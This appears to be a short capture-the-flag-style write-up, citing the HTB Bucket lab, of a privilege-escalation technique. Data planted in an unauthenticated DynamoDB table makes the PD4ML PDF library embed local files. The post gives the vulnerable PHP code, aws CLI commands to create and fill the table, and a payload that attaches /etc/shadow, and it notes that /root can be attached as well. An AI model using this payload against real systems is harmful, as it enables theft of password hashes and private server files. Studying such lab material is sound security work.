---
layout: post
title: PD4ML Attachment from DynamoDB
description: PD4ML Attachment from DynamoDB
summary: PD4ML Attachment from DynamoDB
tags: [privesc,foothold,web,aws]
minute: 1
---
## Overview
Attacker can gain access to sensitive files by embedding it inside PDF doc using pd4ml library via malicuous DynamoDB data.

## Environment Setup
* Server side code that allows user to trigger PDF generation

```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```

* Attacker already has low privileged account access
* Unauthenticated dynamodb endpoint

## Steps
* Create the following table schema

```json
{
	"TableName": "alerts",
	"KeySchema": [{
			"AttributeName": "title",
			"KeyType": "HASH"
		},
		{
			"AttributeName": "data",
			"KeyType": "RANGE"
		}
	],
	"AttributeDefinitions": [{
			"AttributeName": "title",
			"AttributeType": "S"
		},
		{
			"AttributeName": "data",
			"AttributeType": "S"
		}
	],
	"ProvisionedThroughput": {
		"ReadCapacityUnits": 5,
		"WriteCapacityUnits": 5
	}
}
```

* Create dynamodb table by passing json file above

```bash
aws --endpoint-url http://s3.bucket.htb dynamodb create-table --cli-input-json file://./alerts.json
```

* Add data on the table

```bash
aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///etc/shadow</pd4ml:attachment>"}}
```

* Trigger PDF generation by accessing the webpage

```bash
curl -X POST 'http://localhost:8000' -d 'action=get_alerts'
```

* Visit the webpage in the browser and download the embedded file inside the pdf

![](/spindel/assets/PD4ML%20Attachment%20from%20DynamoDB/AD8F0FAA-8C7E-4FAE-8EB8-E937CFB7A0DB.png)

* The embedded file contains `/etc/shadow` of the victim server

## Alternatives
* Instead of attaching files, you can also attach directory paths. The resulting embedded file inside the PDF document will contain the contents of the directory.

```
file:///root
```

## Refeferences
* HTB Bucket
